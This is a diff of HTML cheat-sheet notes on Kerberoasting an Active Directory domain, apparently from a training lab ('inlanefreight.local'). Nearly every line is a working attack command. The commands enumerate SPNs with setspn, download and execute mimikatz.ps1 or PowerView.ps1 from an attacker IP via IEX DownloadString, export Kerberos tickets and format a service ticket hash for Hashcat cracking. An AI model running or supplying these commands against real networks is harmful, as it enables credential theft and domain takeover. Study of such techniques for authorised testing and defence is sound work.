@@ -89,12 +89,9 @@ Look on printers <br>
   Hashcat -m 13100 textfile.txt wordlist.txt <br>
   <br>
   <h2> Kerbroasting from windows </h2><br>
-  using built in setspn.exe -Q */* <br>
-Then load - Add-Type -AssemblyName System.IdentityModel <br>
-  Then load single user - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433" <br>
-  Change the argument list parameter to a name taken when using setspn.exe <br>
-  Now you can load all tickets - setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } <br>
-  Run mimikatz (download fromn machine that can access the internet - IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.160:8000/mimikatz.ps1') <br>
-  Invoke-Mimikatz base64 /out:true <br>
- Invoke-Mimikatz -Command '"kerberos::list /export"'
+ 
+  Run Powerview (download fromn machine that can access the internet - IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.160:8000/PowerView.ps1') <br>
+ Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname <br>
+  Now target account - Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 
